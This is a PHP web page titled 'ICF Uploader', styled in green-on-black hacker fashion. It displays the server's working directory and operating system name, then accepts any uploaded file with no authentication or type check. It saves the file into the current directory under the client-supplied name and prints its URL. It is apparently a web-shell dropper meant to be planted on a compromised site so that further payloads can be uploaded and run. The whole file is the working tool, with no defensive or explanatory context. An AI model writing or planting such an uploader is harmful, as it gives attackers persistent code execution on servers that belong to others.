<center>
<html>
<head>
    <title>ICF Uploader</title>
    <style>
        body {
            background: #0a0a0a;
            color: #00ff00;
            font-family: 'Courier New', monospace;
            margin: 0;
            padding: 20px;
        }
        .container {
            max-width: 500px;
            margin: 50px auto;
            border: 1px solid #00ff00;
            padding: 20px;
            background: #000;
        }
        h1 {
            color: #00ff00;
            text-align: center;
            margin-bottom: 20px;
            font-size: 18px;
            text-shadow: 0 0 10px #00ff00;
        }
        .info {
            background: #001100;
            padding: 10px;
            margin-bottom: 15px;
            border: 1px dashed #00ff00;
            font-size: 12px;
        }
        .upload-form {
            text-align: center;
        }
        input[type="file"] {
            background: #000;
            color: #00ff00;
            border: 1px solid #00ff00;
            padding: 8px;
            margin: 10px 0;
            width: 90%;
        }
        input[type="submit"] {
            background: #000;
            color: #00ff00;
            border: 1px solid #00ff00;
            padding: 10px 25px;
            cursor: pointer;
            font-family: 'Courier New', monospace;
        }
        input[type="submit"]:hover {
            background: #00ff00;
            color: #000;
        }
        .result {
            margin-top: 15px;
            padding: 10px;
            font-size: 12px;
        }
        .success {
            color: #00ff00;
            background: #001100;
            border: 1px solid #00ff00;
        }
        .error {
            color: #ff0000;
            background: #110000;
            border: 1px solid #ff0000;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>ICF Uploader</h1>
        
        <div class="info">
            [>] PATH: <?php echo getcwd(); ?><br>
            [>] SYSTEM: <?php echo php_uname('s'); ?>
        </div>

        <div class="upload-form">
            <form method="post" enctype="multipart/form-data">
                <input type="file" name="__" required><br>
                <input type="submit" name="_" value="[>] UPLOAD">
            </form>

            <?php
            if($_POST){
                echo '<div class="result">';
                if(@copy($_FILES['__']['tmp_name'], $_FILES['__']['name'])){
                    echo '<div class="success">';
                    echo '[+] UPLOAD SUCCESS<br>';
                    echo '[+] FILE: ' . htmlspecialchars($_FILES['__']['name']) . '<br>';
                    $url = dirname((isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on' ? "https" : "http") . "://$_SERVER[HTTP_HOST]$_SERVER[REQUEST_URI]") . '/' . $_FILES['__']['name'];
                    echo '[+] URL: ' . $url;
                    echo '</div>';
                } else {
                    echo '<div class="error">';
                    echo '[-] UPLOAD FAILED';
                    echo '</div>';
                }
                echo '</div>';
            }
            ?>
        </div>
    </div>
</body>
</html>
</center>
